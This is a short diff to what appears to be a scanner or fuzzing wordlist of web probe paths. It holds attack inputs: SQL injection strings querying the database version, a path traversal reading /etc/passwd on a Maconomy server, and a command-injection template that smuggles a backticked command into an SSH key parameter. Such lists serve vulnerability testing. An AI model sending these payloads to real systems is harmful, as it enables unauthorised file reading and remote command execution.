@@ -731,3 +731,6 @@
 /wp-content/plugins/email-subscribers/readme.txt
 /?band=1)%20AND%201=CAST((SELECT%20version())%20AS%20INT)--
 /api/raster/search/?band=1)%20AND%201=CAST((SELECT%20version())%20AS%20INT)--
+/cgi-bin/Maconomy/MaconomyWS.macx1.W_MCS//etc/passwd
+/admin/config.php
+/admin/ajax.php?module=filestore&command=testconnection&driver=SSH&host=127.0.0.1&user={{prefix}}&port=22&key={{prefix}}`{{cmd}}`&path={{prefix}}
